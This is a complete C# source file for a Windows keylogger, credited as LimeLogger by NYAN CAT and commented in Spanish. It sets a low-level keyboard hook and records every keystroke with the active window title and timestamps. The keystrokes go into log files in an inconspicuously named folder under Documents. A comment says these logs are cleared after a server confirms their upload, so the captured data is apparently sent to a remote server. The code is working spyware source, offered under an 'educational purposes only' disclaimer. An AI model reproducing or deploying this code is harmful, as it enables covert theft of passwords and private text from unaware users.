using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;


//       │ Author     : NYAN CAT
//       │ Name       : LimeLogger v0.2.6.1
//       │ Contact    : https://github.com/NYAN-x-CAT
//       This program is distributed for educational purposes only.


namespace AgentLogger
{
    /**
     * Utilidad externa escrita por NYAN CAT (https://github.com/NYAN-x-CAT). 
     * Se encarga de las operaciones relacionadas al registro de teclas del sistema.
     */

    public static class LimeLogger
    {
        private static readonly string loggerPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\Purplecomet";
        private static string CurrentActiveWindowTitle;
        public static string buffer;

        /**
         * Inicia el registro de datos dentro del sistema
         */
        public static void Start()
        {
            if (!Directory.Exists(loggerPath))
                Directory.CreateDirectory(loggerPath);

            Console.Out.WriteLine("LOGGER STARTED");
            _hookID = SetHook(_proc);
            //UnhookWindowsHookEx(_hookID);
            //Application.Exit();
        }

        /**
         * Detiene el registro de datos del sistema
         */
        public static void Stop()
        {
            Console.Out.WriteLine("LOGGER STOPPED");
            UnhookWindowsHookEx(_hookID);
        }

        /**
         * Conexion con el sistema logico de registro de pulsaciones del sistema
         */
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0);
            }
        }
        /**
         * Procesamiento de una pulsacion proveniente del sistema, como un evento.
         */
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                bool capsLock = (GetKeyState(0x14) & 0xffff) != 0;
                bool shiftPress = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
                string currentKey = KeyboardLayout((uint)vkCode);

                if (capsLock || shiftPress)
                {
                    currentKey = currentKey.ToUpper();
                }
                else
                {
                    currentKey = currentKey.ToLower();
                }

                if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
                    currentKey = "[" + (Keys)vkCode + "]";

                else
                {
                    switch (((Keys)vkCode).ToString())
                    {
                        case "Space":
                            currentKey = " ";
                            break;
                        case "Return":
                            currentKey = Environment.NewLine;
                            break;
                        case "Escape":
                            currentKey = "[ESC]";
                            break;
                        case "LControlKey":
                            currentKey = "[CTRL]";
                            break;
                        case "RControlKey":
                            currentKey = "[CTRL]";
                            break;
                        case "RShiftKey":
                            currentKey = "[Shift]";
                            break;
                        case "LShiftKey":
                            currentKey = "[Shift]";
                            break;
                        case "Back":
                            currentKey = "[Back]";
                            break;
                        case "LWin":
                            currentKey = "[WIN]";
                            break;
                        case "Tab":
                            currentKey = "[Tab]";
                            break;
                        case "Capital":
                            if (capsLock == true)
                                currentKey = "[CAPSLOCK_OFF]";
                            else
                                currentKey = "[CAPSLOCK_ON]";
                            break;
                    }
                }

                if (CurrentActiveWindowTitle == GetActiveWindowTitle())
                {
                    buffer += currentKey;
                }
                else
                {
                    buffer += Environment.NewLine;
                    buffer += "### " + DateTime.Now + $" ###  {GetActiveWindowTitle()} ###";
                    buffer += Environment.NewLine;
                    buffer += currentKey;
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }


        /**
         * Detecta el teclado del sistema
         */
        private static string KeyboardLayout(uint vkCode)
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                byte[] vkBuffer = new byte[256];
                if (!GetKeyboardState(vkBuffer)) return "";
                uint scanCode = MapVirtualKey(vkCode, 0);
                IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out uint processId));
                ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 5, 0, keyboardLayout);
                return sb.ToString();
            }
            catch { }
            return ((Keys)vkCode).ToString();
        }

        /**
         * Elimina la informacion temporal almacenada en el sistema.
         * Esto solo se debe realizar cuando se recibe confirmacion del servidor de que la subida de datos fue exitosa.
         */
        public static void ClearFileBuffer()
        {
            try
            {
                using (StreamWriter sw = new StreamWriter(loggerPath + @"\buffer.log", false))
                {
                    sw.Write("");
                }
            }
            catch (Exception ex)
            {
                Console.Out.WriteLine("Error clearing file buffer");
                Console.Out.WriteLine(ex.ToString());
            }
        }

        /**
         * Almacena el buffer temporal del programa en un archivo a modo de respaldo
         */
        public static void StoreBuffer()
        {
            try
            {
                using (StreamWriter sw = new StreamWriter(loggerPath + @"\buffer.log", true))
                {
                    sw.WriteLine();
                    sw.WriteLine("### DATA UPLOAD: " + DateTime.Now + " ###");
                    sw.Write(buffer);
                }

                using (StreamWriter sw = new StreamWriter(loggerPath + @"\historic.log", true))
                {
                    sw.WriteLine("### DATA UPLOAD: " + DateTime.Now + " ###");
                    sw.Write(buffer);
                }

                buffer = "";
            }
            catch (Exception ex)
            {
                Console.Out.WriteLine("Error storing buffer");
                Console.Out.WriteLine(ex.ToString());
            }
        }

        /**
         * Devuelve el contenido del archivo de buffer temporal
         */

        public static string GetFileBufferStr()
        {
            try
            {
                string log = File.ReadAllText(loggerPath + @"\buffer.log");
                return log;
            }
            catch (Exception ex)
            {
                Console.Out.WriteLine("Error reading file buffer");
                Console.Out.WriteLine(ex.ToString());
            }

            return "### WARNING: ERROR WHILE READING FILEBUFFER ###";
        }

        /**
         * Obtiene informacion acerca de la ventana en la que se encuentra el usuario
         */
        private static string GetActiveWindowTitle()
        {
            try
            {
                IntPtr hwnd = GetForegroundWindow();
                GetWindowThreadProcessId(hwnd, out uint pid);
                Process p = Process.GetProcessById((int)pid);
                string title = p.MainWindowTitle;
                if (string.IsNullOrWhiteSpace(title))
                    title = p.ProcessName;
                CurrentActiveWindowTitle = title; //this is bad design btw
                return title;
            }
            catch (Exception ex)
            {
                Console.Out.WriteLine(ex.ToString());
                return "???";
            }
        }


        #region "Hooks & Native Methods"
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        private static int WHKEYBOARDLL = 13;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        static extern uint MapVirtualKey(uint uCode, uint uMapType);
        #endregion
    }
}
